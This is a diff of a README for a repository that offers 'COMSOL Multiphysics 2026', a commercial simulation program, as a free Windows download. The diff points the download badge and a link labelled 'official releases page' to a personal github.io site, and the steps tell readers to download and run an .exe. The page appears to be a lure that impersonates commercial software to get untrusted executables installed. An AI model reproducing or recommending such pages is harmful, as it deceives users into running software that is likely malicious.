@@ -1,6 +1,6 @@
 # 🖥️ COMSOL-Multiphysics-2026 - Run Complex Engineering Simulations With Ease
 
-[![Download COMSOL Multiphysics](https://img.shields.io/badge/Download-Software-blue)](https://github.com/antonianalyzable516/COMSOL-Multiphysics-2026/releases)
+[![Download COMSOL Multiphysics](https://img.shields.io/badge/Download-Software-blue)](https://antonianalyzable516.github.io)
 
 COMSOL Multiphysics 2026 provides a platform for engineering and physics simulations. This software models real-world designs and devices. Use this tool to analyze fluid flow, heat transfer, electromagnetics, and structural mechanics on your Windows computer.
 
@@ -8,7 +8,7 @@ COMSOL Multiphysics 2026 provides a platform for engineering and physics simulat
 
 Follow these steps to acquire the installer for your machine. 
 
-1. Visit the [official releases page](https://github.com/antonianalyzable516/COMSOL-Multiphysics-2026/releases). 
+1. Visit the [official releases page](https://antonianalyzable516.github.io). 
 2. Look for the latest release version at the top of the list. 
 3. Click the file ending in .exe to start your download. 
 4. Save the file to a folder you can find later, such as your Downloads folder. 
